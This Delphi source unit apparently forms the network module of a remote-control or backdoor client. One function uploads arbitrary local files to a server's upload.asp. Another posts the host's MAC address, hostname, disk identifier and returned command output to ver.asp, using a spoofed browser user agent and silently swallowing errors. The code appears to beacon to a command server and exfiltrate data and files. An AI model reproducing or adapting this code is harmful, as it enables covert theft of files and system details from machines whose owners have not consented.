unit Unit_Http;

interface

uses
  Windows,SysUtils,Classes,IdHTTP,IdMultiPartFormData;

Function GET_RFILE(SerUrl:String;PATH:String):String;
Function POST_DATA(SerUrl:String;SerKey:String;cmdMD5:String;BACK:String):String;


implementation

uses Unit_Helper, Unit_WinSys;

//Upload file
Function GET_RFILE(SerUrl:String;PATH:String):String;
var
Content:TIdMultiPartFormDataStream;
Ret:TStringStream;
IdHTTPUP:TIdHTTP;
begin
Randomize;
IdHTTPUP:=TIdhttp.Create(nil);
Content:=TIdMultiPartFormDataStream.Create;
Ret:=TStringStream.Create('');
PATH:=RE_FILE(PATH);
Content.AddFile('upload_file',PATH,'');
IdHTTPUP.Post(SerUrl + '/upload.asp',Content,Ret);
Result:=Ret.DataString;
IdHTTPUP.Disconnect;
Ret.Free;
Content.Free;
End;


//Send data
Function POST_DATA(SerUrl:String;SerKey:String;cmdMD5:String;BACK:String):String;
var
 PostUrl,results:String;
 params:Tstrings;
 cmdBACK:UTF8String;
 IdHTTP1:TIdHTTP;
Begin
 Randomize;
 IdHTTP1:= TIdhttp.Create(nil);
 PostUrl:= SerUrl + '/ver.asp';
 try
   cmdBACK:=AnSiToUtf8(BACK);
   IdHTTP1.Request.AcceptEncoding:='utf-8';
   IdHTTP1.Request.AcceptLanguage:='zh-cn';
   IdHTTP1.Request.ContentType:='application/x-www-form-urlencoded';
   IDHTTP1.Request.ProxyConnection:='Keep-Alive';
   IdHTTP1.Request.UserAgent:='Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; .NET CLR 1.1.4322)';
   params:=TStringList.Create;
   params.Add('MAC=' + GET_MAC);
   params.Add('HOST=' + GET_HOST);
   params.Add('DISK=' + GET_DISK);
   params.Add('SERKEY=' + SerKey);
   params.Add('cmdMD5=' + cmdMD5);
   params.Add('cmdBACK=' + cmdBACK);
   results:=IdHTTP1.Post(PostUrl+'?T='+inttostr(10000+Random(99999)),params);
   IdHTTP1.Disconnect;
   params.Free;
   results:=PChar(Trim(results));
   results:=utf8toansi(results);
   Result:=results;
 except
 end;
 IdHTTP1.Free;
End;


end.
